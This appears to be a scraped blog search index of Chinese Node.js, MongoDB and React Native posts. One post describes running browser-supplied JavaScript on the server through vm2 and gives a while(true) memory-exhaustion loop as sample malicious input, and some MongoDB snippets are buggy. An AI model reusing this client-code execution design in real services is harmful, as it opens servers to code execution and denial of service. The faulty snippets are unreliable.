/serach/users/:keyword 搜索是个怪胎，个人建议是将 serach 放在前面。 如果有很多个资源竞争时，这时候怎么放置呢？例如：用户职位，公司职位。 12345// 获取用户职位集合- GET /users/:id/jobs// 获取公司的职位集合- GET /company/:id/jobs 看 jobs 权重大不大，大的话，jobs 放在前面无疑。 12345// 获取用户职位集合- GET /jobs/users/:id// 获取公司的职位集合- GET /jobs/company/:id 版本号一般版本号会放在二级域名或路径里。 123http://v1.api.abc.com/xxxhttp://abc.com/api/v1/xxx","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"Nodejs 爬虫生态介绍篇","slug":"抓包&爬虫/Nodejs 爬虫生态介绍篇","date":"2019-10-20T06:50:18.000Z","updated":"2021-06-15T06:10:52.916Z","comments":true,"path":"/stories/2019/10/抓包&爬虫/Nodejs 爬虫生态介绍篇/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/抓包&爬虫/Nodejs 爬虫生态介绍篇/","excerpt":"前言如果你了解爬虫的原理，那么本质上爬虫的技术本身与语言无语，任何语言都能写爬虫。 本文主要介绍 Nodejs 的爬虫生态，从库，框架等方面介绍。","text":"前言如果你了解爬虫的原理，那么本质上爬虫的技术本身与语言无语，任何语言都能写爬虫。 本文主要介绍 Nodejs 的爬虫生态，从库，框架等方面介绍。 爬虫基本原理爬虫的基于原理非常简单，最简单的方式只包括了两个过程：请求与解析。 请求目标 url 的页面，拿到 html 的数据。 从 html 数据里获取有用的信息。 将获取的信息存储到数据库里。 爬虫抓取结束。 框架Nodejs 爬虫框架本身不多，比较固定的就那么几个，其主要原因是 Nodejs 本身是追求轻量级的，不需要太多花俏的东西。 框架 介绍 cheerio 一个高性能的 DOM 解析库，语法与 JQuery 一致，一般用于静态数据解析。 jsdom JsDom 是一个在 Nodejs 上模拟 DOM 环境的库，可以在 Nodejs 上运行网页。 puppeteer Puppeteer 是一个 Chrome 开发团队推出的一个无头浏览器库，一般用于动态数据解析。 node-crawler 一个基于 Cheerio 的 Nodejs 爬虫框架，主要提供了任务队列。 apify 一个 Cheerio + Puppeteer 的爬虫框架，内置的功能比较多，可以说是一个比较全面的框架。 网络库Nodejs 网络库有很多，比较常用的就那么几个，具有使用看兴趣吧，其实都一样。 框架 介绍 got 简化的 HTTP 请求。 node-fetch 一个轻量级的 http 模块，将 window.fetch 带到 Node.js。 request 简化的 HTTP 请求客户端。 axios 基于 Promise 的 HTTP 客户端，用于浏览器和 node.js。 异步控制使用 Nodejs 写爬虫的优势和特点是：异步，因此可以不用线程的进行几千的并发抓爬。 框架 介绍 bluebird 比原生 Promise 更多功能的 Promise 库。 async.js 功能强大，性能优越的异步流程控制库。 定时任务 框架 介绍 schedule Nodejs 的定时任务库。 数据存储 框架 介绍 mysql mysql 在 Nodejs 上客户端。 mongoose 具有模型定义的 Mongodb 库。 lowDB 本地的 json 数据库。 redisio Nodejs 上的一个 redis 库。 warehouse 有着类似 Mongodb Api 风格的本地 json 数据库。 xlsx 可以到处 excel 文件的 Nodejs 库。 csv-parse 在 Nodejs 上读取和导出 csv 的库。 多线程，多进程有时候需要多线程处理，在 Nodejs 12 原生已经支持了多线程了：worker_threads。 多进程使用 Nodejs 的 cluster 或 child_process 即可。 框架 介绍 greenlet Nodejs 上都 Web Workers 实现库。 工具函数在 Npm 上搜索，一大堆。 框架 介绍 lodash 现代化的 JavaScript 实用程序库，提供模块化，性能和附加功能。 编码，转码 框架 介绍 iconv-lite 一个专门用户转码的库。 可视化用前端库就可以了。 框架 介绍 antv AntV 是蚂蚁金服全新一代数据可视化解决方案。 echarts 百度开源的数据可视化框架，现在已经捐给了 Apache。 分布式单机爬虫遇到瓶颈，来搞搞多机的分布式，目前 Nodejs 没有分布式的爬虫框架。建议自己基于 redis 搭建，如果你懂分布式，这一点都不难好么。","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Win10 上安装 node-gyp","slug":"Nodejs/Win10 上安装 node-gyp","date":"2019-10-19T05:05:48.000Z","updated":"2021-06-15T06:10:52.842Z","comments":true,"path":"/stories/2019/10/Nodejs/Win10 上安装 node-gyp/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/Nodejs/Win10 上安装 node-gyp/","excerpt":"前言gyp 是一种根据 c++ 源代码编译的工具，node-gyp 就是为 node 编译 c++ 扩展的时候使用的编译工具。 最近在研究 native script 需要使用到 node-gyp，遇到一些问题所以将解决方案记录在这里。 windows 下的安装方法这是为 node 编译 c++ 扩展的工具所以你肯定是有 node 环境的，这时，使用 npm 全局安装即可。 1npm install -g node-gyp","text":"前言gyp 是一种根据 c++ 源代码编译的工具，node-gyp 就是为 node 编译 c++ 扩展的时候使用的编译工具。 最近在研究 native script 需要使用到 node-gyp，遇到一些问题所以将解决方案记录在这里。 windows 下的安装方法这是为 node 编译 c++ 扩展的工具所以你肯定是有 node 环境的，这时，使用 npm 全局安装即可。 1npm install -g node-gyp 到这里我们还不可以进行编译，因为 node-gyp 需要依赖 python2.7 和微软的 vc++ 构建工具来进行编译，这在 linux 系统上没问题，因为 linux 上都默认安装了，但是 windows 操作系统在默认情况下不会安装 python2.7 和 vc++ 构建工具。 配置 python2.7安装好 python2.7 后，将其添加到环境路径里，然后在 npm 里设置 python 的路径。 1npm config set python D://python2.7/python.exe 安装 Visual C++ Build Tools首先，Visual C++ Build Tools 从微软官方网站下载 vc++构建工具（vs_BuildTools.exe），安装的时候使用默认安装就可以了，这个步骤比较简单。和安装 vs 一样只需要等待就可以了。 打开后选择，必须的模块，并记住当前安装的版本，例如现在安装的是 2017 版的。 看右边的选择，安装的大小比较大，有 5 个G（擦）。 安装完成后配置版本： 1npm config set msvs_version 2017 如果不出意外的话我们就可以用 node-gyp 进行构建了。 这时候，可以安装一个需要编译的模块来试试。 123npm install -g isolated-vmnpm uninstall -g isolated-vm 如果遇到问题，请看官网的文档吧：https://github.com/Microsoft/nodejs-guidelines/blob/master/windows-environment.md#compiling-native-addon-modules","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"基于 Nodejs 的 Serverless 实现","slug":"Nodejs/基于 Nodejs 的 Serverless 实现","date":"2019-10-18T01:04:19.000Z","updated":"2021-06-15T06:10:52.844Z","comments":true,"path":"/stories/2019/10/Nodejs/基于 Nodejs 的 Serverless 实现/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/Nodejs/基于 Nodejs 的 Serverless 实现/","excerpt":"前言Serverless 是一种 “无服务器架构”，让用户无需关心程序运行环境、资源及数量，只要将精力关注到业务逻辑上的技术。 Serverless 架构Serverless 即无服务器架构。 通常我们的应用，都会有一个后台程序，它负责处理各种请求和业务逻辑，一般都需要跟网络、数据库等 I/O 打交道。而所谓的无服务器架构，就是把除了业务代码外的所有事情，都交给执行环境处理，开发者不需要知道 server 怎么跑起来，数据库的 api 怎么调用一切交给外部，在“温室”里写代码即可。 FaaS：而云函数，正是 Serverless 架构得以实现的途径。我们的应用，将是一个个独立的函数组成，每一个函数里，是一个小粒度的业务逻辑单元。没有服务器，没有 server 程序，“函数即服务”（Functions as a Service）。","text":"前言Serverless 是一种 “无服务器架构”，让用户无需关心程序运行环境、资源及数量，只要将精力关注到业务逻辑上的技术。 Serverless 架构Serverless 即无服务器架构。 通常我们的应用，都会有一个后台程序，它负责处理各种请求和业务逻辑，一般都需要跟网络、数据库等 I/O 打交道。而所谓的无服务器架构，就是把除了业务代码外的所有事情，都交给执行环境处理，开发者不需要知道 server 怎么跑起来，数据库的 api 怎么调用一切交给外部，在“温室”里写代码即可。 FaaS：而云函数，正是 Serverless 架构得以实现的途径。我们的应用，将是一个个独立的函数组成，每一个函数里，是一个小粒度的业务逻辑单元。没有服务器，没有 server 程序，“函数即服务”（Functions as a Service）。 优点Serverless 比 BFF 更为先进，可以做到 100% 的由前端决定数据的格式。 在这种情况下，使用某一个云服务，就会调用某一个系统自带的 API 一样简单。 拥有实现快速上线，更快的部署流水线，更快的开发速度。 后端可以根据数据领域进行设计云 API，而不需要兼顾前端。 前端可以调用云函数进行业务逻辑的编写。 前端可以由自己决定数据的返回格式。 适合轻量级的 API 服务，微服务架构，不适合长时间运行应用。 缺点 缺乏调试和开发工具。 安全性需要考虑与防范。 对于 Nodejs 来说支持比较好，其他语言需要用 Nodejs 做中间件服务。 目前缺少成熟 Serverless 框架。 由于 API 的复合逻辑在前端进行组合，因此对于需要事务性的 API 不能放在 Serverless 里。 由于逻辑分散在前端里，如果前端应用端很多，可能会存在较多的重复逻辑编写（可以通过统一解决）。 如何实现？云函数声明首先，后端先进行一系列的封装，将一个数据层的 api 封装起来给前端调用。 1234// 后端定义的云函数module.exports.getUser = async function (ctx) &#123;&#125;; 封装完成后，将云函数注入到上下文里，提供给前端调用。 前端调用由于云函数的执行通常伴随着接口的调用，因此需要规定一下前端传递的数据格式。 1234567891011// 前端 http 请求时的 body 数据域&#123; // 本地的上下文注入 inject: &#123; id: 1, &#125;, // ctx 是服务端的上下文 func: async function (ctx, &#123; id &#125;) &#123; return ctx.getUser(id); &#125;,&#125; 由于前端不能直接的传递函数，因此需要将函数变成字符串，使用 function.toString() 可以将函数变成字符。 函数执行在上面定义了如何声明函数，这里定义如何执行函数。 在 js 世界里，执行一个字符串类型的函数体，有以下这么一些途径： eval 函数 new Function vm 模块 前面 2 个可以排除，最后在 Nodejs 使用 VM 模块，由于社区有一个 VM2 的模块，比 Nodejs 的 VM 模块还要安全，因此这里使用 VM2。 VM 需要执行的是函数的字符串，使用 function.toString() 可以将函数变成字符。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const &#123; VM &#125; = require('vm2');const ctx = &#123; getUser,&#125;;async function run() &#123; // 构造上下文 const sandbox = &#123; ctx: Object.assign(ctx, &#123;&#125;), result: &#123; data: null, error: null, &#125;, console: undefined, // 生产环境时建议关了 console，以免影响性能 inject: inject, &#125;; const start = Date.now(); // 初始化 vm const vm = new VM(&#123; timeout: 1000 * 1, eval: false, wasm: false, sandbox: sandbox, &#125;); // 运行代码 try &#123; vm.run(` const func = $&#123;funcStr.toString()&#125;; const ctx = global.ctx; const inject = global.inject; const result = global.result; try &#123; result.data = func(ctx, inject); &#125; catch (err) &#123; result.error = err.message; &#125; `); return &#123; result: await sandbox.result.data || null, executionTime: Date.now() - start, error: sandbox.result.error, &#125;; &#125; catch (err) &#123; sandbox.result.error = err.message; return &#123; result: null, executionTime: Date.now() - start, error: sandbox.result.error, &#125;; &#125;&#125; 运行的效果： 123456789101112131415161718192021cloud.run(&#123; inject: &#123; offset: 3, limit: 10, &#125;, func: async function (ctx, &#123; offset, limit &#125;) &#123; // 获取当前的用户列表 const users = await ctx.getUsers().skip(offset).limit(limit); const total = await ctx.getUsers().countDocuments(); return &#123; total: total, list: users.map(i =&gt; (&#123; id: i._id, age: i.age, name: i.name, summary: i.summary, &#125;)), &#125;; &#125;,&#125;); 性能问题云函数执行的时候，都需要进行一下几步： 获取函数体（http 传输性能） 编译代码（大致要 1 ~ 2ms） 构造作用域和独立环境（大致要 1 ~ 2ms） 执行 在具体的使用里，发现 vm 的创建时间在 1 ~ 2ms 之间，每个云函数的执行时间在 3 ~ 10ms 之间，具体的业务代码，自己控制的精细一点，性能方面不会有太大问题。 可以尝试在前端发生的请求体里添加一个缓存控制的字段： 12345678910111213141516// 前端 http 请求时的 body 数据域&#123; // 缓存 cache: &#123; enable: true, time: 1000, &#125;, // 本地的上下文注入 inject: &#123; id: 1, &#125;, // ctx 是服务端的上下文 func: async function (ctx, &#123; id &#125;) &#123; return ctx.getUser(id); &#125;,&#125; 其二就是将，编译之后的 script 保存起来。 12const script = VMScript(`...`);vm.run(script); 后端根据 cache 字段来决定是否取缓存值。 安全性问题由于代码是从前端传递过去的 js 执行代码，在安全性上肯定会有一定的隐患。虽然只提供有效的上下文，但是无法避免的可能被人恶意的使用 while(true) 等恶意代码，导致 Nodejs 崩溃的问题。 例如： 1234const arr = [];while (true) &#123; arr.push(1);&#125; 这样的代码会导致 Nodejs 内存爆炸。 现在能想到的方式是： 前端传递过来的代码，进行加密（与时间戳，字符串长度相关的加密） 后端进行解密，验证时间（相差 1 分钟，拒绝执行） 在后端里使用正则判断是否有 while 和 for，拒绝使用。 直到了我发现了这货：https://www.npmjs.com/package/isolated-vm isolated-vm 是一个完全的物理隔离，并且是运行在不同的线程上，它有以下的特性： 安全性 内存限制 物理隔离 多线程支持 调试支持（Inspector，Chrome DevTools） 参考资料 官方文档: https://nodejs.org/dist/latest-v12.x/docs/api/vm.html 什么是 Serverless（无服务器）架构？: https://jimmysong.io/posts/what-is-serverless/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Mongodb 数据模型设计","slug":"MongoDB/Mongodb 数据模型设计","date":"2019-10-17T08:48:43.000Z","updated":"2021-06-15T06:10:52.827Z","comments":true,"path":"/stories/2019/10/MongoDB/Mongodb 数据模型设计/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/MongoDB/Mongodb 数据模型设计/","excerpt":"前言Mongodb 是文档型数据库，由于其不属于关系型数据库，不必遵守三大范式，而且也没有 Join 关键字来支持表连接，所以 Mongodb 的表结构设计跟 Oracle、MySQL 很不一样。 下面针对几种不同的表设计结构分别举例。","text":"前言Mongodb 是文档型数据库，由于其不属于关系型数据库，不必遵守三大范式，而且也没有 Join 关键字来支持表连接，所以 Mongodb 的表结构设计跟 Oracle、MySQL 很不一样。 下面针对几种不同的表设计结构分别举例。 一对一关系模型在关系型数据库中，一对一关系模型通常是通过外键的形式进行处理。 关系式我们以作家跟地址来举例，假设这两个实体的关系是一对一，那么我们可能会像下面这样子建表。 Id Name Age 1 小明 20 Id Uid Street City 2 1 100 some 广东省 1Select * From a Inner Join b On a.Id = b.Uid 但是，为了方便，其实我们在设计表的时候不会严格遵守三大范式，会做一定的冗余数据，实际情况下可能就是这样子的表。 Id Uid Street City Name Age 2 1 100 some 广东省 小明 20 这样的好处时不需要进行连接查询，坏处是有数据冗余，并且没有数据的时序关联。 MongoDB那么，我们回到 Mongodb，在这张非关系型的 NoSQL 数据库里，没有关联查询，我们可以怎么来建立表并处理表之间的关系呢？ 1. 内嵌文档：直接把地址信息的文档作为用户信息文档的一个字段储存进去。这种方式非常的通用，也是 MongoDB 的杀手锏。 12345678&#123; name: 'Peter Wilkinson', age: 27, address: &#123; street: '100 some road', city: 'Nevermore' &#125;,&#125; 2. 关联文档：虽然 MongoDB 没有 Join 的语法，但是我们仍然可以通过 id 的关联性来查询。 12345678910111213// 用户信息的文档设计&#123; _id: 1, name: 'Peter Wilkinson', age: 27&#125;// 地址信息的文档设计&#123; uid: 1, street: '100 some road', city: 'Nevermore'&#125; 最后利用 in 语法来实现查询，最终只是查询 2 次而已，将结果合并到用户信息里。 12345const users = await db.user.find();const addrs = await db.address.find(&#123; uid: &#123; $in: users.map(i =&gt; i._id) &#125; &#125;);// 由于查询的结果顺序是 id 的顺序，因此可以直接合并addrs.forEach(item =&gt; users.address = item); 如果内嵌的数据很小，并且是一对一的，强烈建议使用内嵌的方式。 一对多关系模型一对多的关系模型，我们可以简单地以文章和对应的评论信息来举例，一个博客文章会对应很多评论，一个评论只属于一篇文章。 关系式在关系型数据库里，我们通常是分别建立两张表：一个 Blog 表、一个 Comments 表、一个用户信息表（从表，带有 blog_id 外键），然后通过 join 操作把两个表关联起来。 Id Name Age 1 小明 20 Id Uid title Content 2 1 An awesome blog This is an awesome blog Id Bid Name Comment 1 2 小美 hahaha 123Select * From b From (b Inner Join a on b.uid = a.id) Inner Join c on b.id = c.bid 三表连接查询比较复杂，这也反映了关系式数据库的复杂程度。 MongoDB在 Mongodb 里由于没有 Join 关键字，但是我们可以根据 Mongodb 的特点，得出以下三个解决方式： 1. 内嵌文档： 1234567891011121314151617181920// 内嵌了评论信息的博客文档设计&#123; _id: 1, title: 'An awesome blog', content: 'This is an awesome blog we have just started', user: &#123; _id: 1, name: '小明', age: 20, &#125;, comments: [&#123; _id: 1, name: 'Peter Critic', comment: 'Awesome blog post', &#125;, &#123; _id: 2, name: 'tshn Page', comment: 'Not so awesome blog', &#125;]&#125; 需要注意几点是： 这种内容方式，查询非常好，但是每次用户更新时，都需要同步的将数据，更新到内嵌的 user 对象里。可以将 user 改成引用关联模式，解决此问题。 博客下的评论数组可能会逐渐扩增，甚至于超过了文档的最大限制长度：16MB。 第二个问题是跟写性能相关，由于评论是不停地添加至博客文档里，当有新的博客文档插入集合的时候，MongoDB会变得比较困难定位到原来的博客文档位置，另外，数据库还需要额外开辟新的内存空间并复制原来的博客文档、更新所有索引，这需要更多的IO交互，可能会影响写性能 2. 关联文档： 123456789101112131415// 博客的文档设计&#123; _id: 1, title: 'An awesome blog', content: 'This is an awesome blog we have just started' userId: 1,&#125;// 评论的文档设计&#123; _id: 1, blogId: 1, name: 'Peter Critic', comment: 'Awesome blog post'&#125; 同样的可以采用关联文档的设计，这里需要查 3 次。 12345678const blogs = await db.blog.find();const users = await db.user.find(&#123; _id: &#123; $in: blogs.map(i =&gt; i.userId) &#125; &#125;);const comments = await db.comment.(&#123; _id: &#123; $in: blogs.map(i =&gt; i.blogId) &#125; &#125;);blogs.forEach((item, index) =&gt; &#123; blogs.user = users[index]; blogs.comment = comments[index];&#125;); 多对多关系模型多对多关系模型，我们以作者跟创作的书籍来举例，一本书会有不止一个作者，一个作者会有不止一本书。 关系式作者信息表 Id Name 1 小明 书籍信息表 Id Title Categories 2 YTo hahaha 中间信息表 Id Uid BookId 1 1 2 1Select * From c Inner Join a.Id = c.Uid and b.id = c.BookId; MongoDB在 MongoDB 里我们可以通过单、双向嵌套，把两个文档的 id 通过数组字段添加到彼此的文档里。 1. 单向嵌套： 12345678910111213// 作者信息&#123; _id: 1, name: 'drama',&#125;// 通过 id 关联对应分类的书籍信息文档设计&#123; _id: 1, title: 'A tale of two people', categories: ['drama'], authors: [1, 2],&#125; 如果是详情信息： 12345678910// 根据作者 id 来查书籍const authorId = 1;const books = await db.book.find(&#123; authors: &#123; $in: [authorId] &#125; &#125;);// 根据书籍的 id 来查作者const bookId = 1;const book = await db.book.findOne(&#123; _id: bookId &#125;);const authors = await db.author.find(&#123; _id: &#123; $in: [book.authors] &#125; &#125;);book.authors = authors; 如果是列表信息： 12345678910111213141516171819202122// 获取书籍列表，包含显示作者信息const books = await db.book.find();// 降维度，加去重const authorIds = [...new Set(books.reduce((s, v) =&gt; [...s, ...v.authors], []))];const authors = await db.author.find(&#123; _id: &#123; $in: authorIds &#125; &#125;);// 数据合并books = books.map(book =&gt; &#123; book.authors = book.authors.map(id =&gt; authors.find(author =&gt; id === author._id)) return book;&#125;);// 获取作者列表，包括显示书籍信息const authors = await db.author.find();const authorIds = author.map(i =&gt; i._id);const books = await db.book.find(&#123; authors: &#123; $in: [authorIds] &#125; &#125;);// 数据合并authors = authors.map(author =&gt; &#123; author.books = books.find(book =&gt; book.authors.includes(author._id)); return author;&#125;); 同样的也是两次查询。 2. 双向嵌套 1234567891011121314// 作者信息&#123; _id: 2, name: 'Georg Peterson', books: [2],&#125;// 书籍信息&#123; _id: 1, title: 'A tale of two people', categories: ['drama'], authors: [1, 2]&#125; 如果是详情信息： 123456789// 根据作者 id 来查询书籍const authorId = 1;const author = await db.author.find(&#123; _id: authorId &#125;);const books = await db.book.find(&#123; _id: &#123; $in: [author.books] &#125; &#125;);// 根据书籍 id 来查询作者const bookId = 1;const book = await db.book.find(&#123; _id: bookId &#125;);const authors = await db.author.find(&#123; _id: &#123; $in: [book.authors] &#125; &#125;); 如果是列表信息： 123456789101112131415161718192021// 获取书籍列表，包含显示作者信息const books = await db.book.find();// 降维度，加去重const authorIds = [...new Set(books.reduce((s, v) =&gt; [...s, ...v.authors], []))];const authors = await db.author.find(&#123; _id: &#123; $in: authorIds &#125; &#125;);// 数据合并books = books.map(book =&gt; &#123; book.authors = book.authors.map(id =&gt; authors.find(author =&gt; id === author._id)) return book;&#125;);// 获取作者列表，包括显示书籍信息const authors = await db.author.find();// 降维度，加去重const bookIds = [...new Set(authors.reduce((s, v) =&gt; [...s, ...v.books], []))];const books = await db.book.find(&#123; _id: &#123; $in: bookIds &#125; &#125;);// 数据合并authors = authors.map(author =&gt; &#123; author.books = author.books.map(id =&gt; books.find(book =&gt; id === book._id)) return author;&#125;); 同样的也是两次查询。 参考资料无","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"React Native 直播类型应用开发","slug":"React Native/Media/React Native 直播类型应用开发","date":"2019-10-10T07:31:55.000Z","updated":"2021-06-15T06:10:52.857Z","comments":true,"path":"/stories/2019/10/React Native/Media/React Native 直播类型应用开发/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/React Native/Media/React Native 直播类型应用开发/","excerpt":"前言声网 Agora 为开发者提供实时音视频 API，只需集成 Agora SDK，即可快速在应用内构建多种实时互动场景。 Agora 支持 Electron、React Native、Flutter 等跨平台开发框架。Electron 支持 macOS、Windows 的 PC 端跨平台应用开发。React Native、Flutter 支持 Android、iOS 的跨平台应用开发。 本文讲述如何利用 声网（agora） 在 React Native 上实现视频的一对一直播聊天。","text":"前言声网 Agora 为开发者提供实时音视频 API，只需集成 Agora SDK，即可快速在应用内构建多种实时互动场景。 Agora 支持 Electron、React Native、Flutter 等跨平台开发框架。Electron 支持 macOS、Windows 的 PC 端跨平台应用开发。React Native、Flutter 支持 Android、iOS 的跨平台应用开发。 本文讲述如何利用 声网（agora） 在 React Native 上实现视频的一对一直播聊天。 快速开始安装依赖： 12npm install --save react-native-agorareact-native link react-native-agora 初始化配置初始化使用 RtcEngine.init，意为 初始化 Agora 引擎。 1234567891011121314import &#123; RtcEngine, AgoraView &#125; from 'react-native-agoraio';RtcEngine.init(&#123; appid: 'xxx', // 控制台申请 channelProfile: 1, // 频道模式，1 :直播互动 videoProfile: 40, // 640x480(resolution)、15(fps)、500(kbps) clientRole: 1, // 1: Broadcaster, // 2: Audience，实现双向语音通话设置角色为主播即可 swapWidthAndHeight: true,&#125;); 配置比较重要的是 clientRole，如果是主播（推流者）则是 1，如果是听众（收流着）则是 2。如果两个人互相视频对话，则两个人都设置为 1 即可。 渲染视频界面渲染视频界面使用 AgoraView，它是一个界面组件，它有两种显示方式： 显示本地的视频视角。 显示其他人的视频视角。 123456789101112import &#123; AgoraView &#125; from 'react-native-agoraio';// 显示本地的视频视角&lt;AgoraView showLocalVideo=&#123;true&#125; /&gt;// 显示其他人的视频视角&lt;AgoraView // 多视频界面覆盖 设置为 true 优先在上层（android） zOrderMediaOverlay=&#123;true&#125; // 显示远程视频 UID remoteUid=&#123;uid&#125;/&gt; AgoraView 支持 style 属性。 单纯显示还不行，往往需要配合一些事件来确定是否连接成功，通过监听 onJoinChannelSuccess 来知道是否进入了房间里： 12345678910RtcEngine.eventEmitter(&#123; onJoinChannelSuccess: (data) =&gt; &#123; // 加入房间成功 console.log(data); // 加入成功之后，才渲染 AgoraView this.setState(&#123; isJoinSuccess: true &#125;); &#125;,&#125;);isJoinSuccess ? AgoraView : View 主播和听众的一个道理的，如果是主播，则表示创建房间成功，如果是听众则表示加入房间成功。 听众加入/主播创建房间当某个主播创建了房间之后，会有一个唯一的 channel。其他人加入进来时，需要根据房间的 channel。 123// 听众加入房间// 主播创建房间RtcEngine.joinChannel(channel, uid); uid 用于绑定进入房间的用户 id，uid 为 0 时表示系统自动分配。建议传入此用户的 uid 即可。 如果是主播操作的话，是一个创建房间的行为。 一般会在页面组件的 componentDidMount 里执行。 听众离开/主播关闭房间听众离开房间或主播关闭房间，需要调用 leaveChannel 离开房间，调用 destroy 销毁引擎实例，调用 removeEmitter 取消监听事件。 123RtcEngine.leaveChannel();RtcEngine.destroy();RtcEngine.removeEmitter(); 一般会在页面组件的 componentWillUnmount 里执行。 切换角色听众和主播角色切换，一般场景是用于一对一对话的场景。 1RtcEngine.changeRole(); 视频管理常见的视频设置 api，这些 api 都在 RtcEngine 下。 https://docs.agora.io/cn/Video/API%20Reference/java/index.html 1RtcEngine.startPreview(); 音频管理常见的音频设置 api，这些 api 都在 RtcEngine 下。 https://docs.agora.io/cn/Video/API%20Reference/java/index.html 1RtcEngine.enableAudio(); 响应事件常见的响应事件 api，这些 api 都在 RtcEngine.eventEmitter 对象里。 https://docs.agora.io/cn/Video/API%20Reference/java/index.html 12345RtcEngine.eventEmitter(&#123; onConnectionStateChanged(state: number, reason: number) &#123; &#125;,&#125;); 也可以单个搞： 123RtcEngine.on('clientRoleChanged', (data) =&gt; &#123; console.log(\"[RtcEngine] onClientRoleChanged\", data);&#125;) 狼人杀应用场景狼人杀里一般只用到语音，因此，先关闭视频功能。 1234stopPreview(); // 停止视频预览disableVideo(); // 关闭视频模块enableLocalVideo(); // 关闭本地视频采集muteAllRemoteVideoStreams(true); // 停止接收所有视频流 一般的狼人杀时按顺序的某个用户说话，假设有 4 个用户 1，2，3，4。 1 说话： 12345// ---- 1. 来说 ----// 停止接受所有的音频流RtcEngine.muteAllRemoteAudioStreams();// 发送本地的音频RtcEngine.muteLocalAudioStream(false); 其他用户： 123456---- 其他用户 ----// 停止接受 1 之外的用户[1, 2, 3, 4].filter(i =&gt; i !== 1).forEach(i =&gt; RtcEngine.muteRemoteAudioStream(i, true));RtcEngine.muteLocalAudioStream(true); 参考资料 https://github.com/midas-gufei/react-native-agoraio#readme https://docs.agora.io/cn/Video/API%20Reference/java/index.html https://github.com/AgoraIO-Community/Agora-RN-Quickstart","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native 全局错误","slug":"React Native/React Native 全局错误","date":"2019-10-10T02:18:59.000Z","updated":"2021-06-15T06:10:52.861Z","comments":true,"path":"/stories/2019/10/React Native/React Native 全局错误/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/React Native/React Native 全局错误/","excerpt":"前言React Native 全局错误 全局监听错误12npm install react-native-exception-handlerreact-native link react-native-exception-handler","text":"前言React Native 全局错误 全局监听错误12npm install react-native-exception-handlerreact-native link react-native-exception-handler 12345678910import &#123; setJSExceptionHandler &#125; from 'react-native-exception-handler';setJSExceptionHandler((error, isFatal) =&gt; &#123; if (isFatal) &#123; //... 错误处理 &#125; else &#123; console.log(e); &#125;&#125;); 重启应用使用 react-native-restart 在发生错误处重启应用。 12npm install react-native-restartreact-native link react-native-restart 123import RNRestart from 'react-native-restart';RNRestart.Restart(); 参考资料 https://www.npmjs.com/package/react-native-exception-handler https://www.npmjs.com/package/react-native-restart","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native + React 混合开发","slug":"React Native/React Native 实现 ImageModalView","date":"2019-09-26T08:50:17.000Z","updated":"2021-06-15T06:10:52.861Z","comments":true,"path":"/stories/2019/09/React Native/React Native 实现 ImageModalView/","link":"","permalink":"http://me.lizhooh.com/stories/2019/09/React Native/React Native 实现 ImageModalView/","excerpt":"前言Modal 是 React Native 原生基本的弹窗，在外部通过 visible 属性来显示是否弹出。只提供了声明式的显示方式，而没有提供命令式的显示方式，怎么说有好也有坏。","text":"前言Modal 是 React Native 原生基本的弹窗，在外部通过 visible 属性来显示是否弹出。只提供了声明式的显示方式，而没有提供命令式的显示方式，怎么说有好也有坏。 吐槽点很多人有这样的感觉，在使用一个弹窗（modal）组件时需要自己额外的控制显示与关闭，并且还是声明式的使用，但某些地方频繁使用 modal view 时就会显得非常麻烦。比如我们希望点击某些图片时显示大图浏览，聪明的你可能会这样写： 1234567891011121314151617181920class App extends Component &#123; state = &#123; visible: false, // 掺杂着其他的状态 &#125; render() &#123; return ( &lt;View&gt; &lt;Modal visible=&#123;visible&#125; ... &gt; ... &lt;/Modal&gt; &lt;/View&gt; ); &#125;&#125; 